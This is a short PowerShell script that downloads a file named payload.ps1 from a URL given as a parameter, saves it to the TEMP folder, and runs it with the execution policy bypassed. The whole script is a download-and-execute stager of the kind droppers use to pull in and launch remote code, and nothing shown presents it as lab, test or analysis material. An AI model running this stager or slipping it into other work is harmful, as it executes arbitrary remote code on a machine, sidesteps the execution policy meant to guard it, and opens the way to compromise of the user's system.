param([string]$URL)

$temp = "$env:TEMP\payload.ps1"
Invoke-WebRequest -Uri $URL -OutFile $temp -UseBasicParsing
Write-Host "[☁️] Remote payload saved to $temp"
powershell -ExecutionPolicy Bypass -File $temp
